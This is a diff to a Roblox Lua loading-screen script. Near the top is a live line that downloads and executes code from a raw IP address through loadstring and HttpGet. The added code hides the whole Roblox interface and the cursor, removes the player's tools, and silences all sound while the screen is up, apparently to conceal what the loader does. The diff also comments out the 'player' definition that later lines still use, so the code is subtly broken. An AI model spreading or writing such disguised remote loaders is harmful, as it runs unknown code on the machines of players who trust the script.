@@ -2,10 +2,69 @@
 ID = "9616e3d1-e054-47a2-b17e-94fb52bfc5a9";
 loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/loader.luau"))()
 
--- 🟣 Pantalla de carga galáctica
-local player = game.Players.LocalPlayer
+-- local player = game.Players.LocalPlayer
+local StarterGui = game:GetService("StarterGui")
+local UserInputService = game:GetService("UserInputService")
 local RunService = game:GetService("RunService")
 
+-- Ocultar interfaz de Roblox
+for _, guiType in ipairs(Enum.CoreGuiType:GetEnumItems()) do
+    pcall(function()
+        StarterGui:SetCoreGuiEnabled(guiType, false)
+    end)
+end
+UserInputService.MouseIconEnabled = false
+
+-- Ocultar herramientas equipadas
+local herramientasGuardadas = {}
+if player.Character then
+    for _, tool in ipairs(player.Character:GetChildren()) do
+        if tool:IsA("Tool") then
+            table.insert(herramientasGuardadas, tool)
+            tool.Enabled = false
+            tool.Parent = nil
+        end
+    end
+end
+
+-- Ocultar GUIs personalizadas
+local guiContenedores = {
+    player:WaitForChild("PlayerGui"),
+    game:GetService("StarterGui"),
+    player.Character or player.CharacterAdded:Wait()
+}
+for _, contenedor in ipairs(guiContenedores) do
+    for _, gui in ipairs(contenedor:GetDescendants()) do
+        if gui:IsA("ScreenGui") or gui:IsA("BillboardGui") or gui:IsA("SurfaceGui") then
+            gui.Enabled = false
+        elseif gui:IsA("TextButton") or gui:IsA("ImageButton") then
+            gui.Visible = false
+            gui.Active = false
+        end
+    end
+end
+
+-- Silenciar todos los sonidos del juego
+for _, s in ipairs(workspace:GetDescendants()) do
+    if s:IsA("Sound") then
+        s.Volume = 0
+        s:Stop()
+    end
+end
+
+task.spawn(function()
+    while player:FindFirstChild("PlayerGui"):FindFirstChild("PantallaDeCarga") do
+        for _, s in ipairs(workspace:GetDescendants()) do
+            if s:IsA("Sound") then
+                s.Volume = 0
+                s:Stop()
+            end
+        end
+        wait(0.5)
+    end
+end)
+
+-- Pantalla de carga
 local gui = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
 gui.Name = "PantallaDeCarga"
 gui.IgnoreGuiInset = true
@@ -130,8 +189,13 @@ RunService.RenderStepped:Connect(function(dt)
     end
 end)
 
--- Cerrar pantalla de carga después del tiempo
+-- Restaurar sonidos al finalizar
 task.delay(tiempoTotal, function()
     sonido:Stop()
     gui:Destroy()
+    for _, s in ipairs(workspace:GetDescendants()) do
+        if s:IsA("Sound") then
+            s.Volume = 1
+        end
+    end
 end)
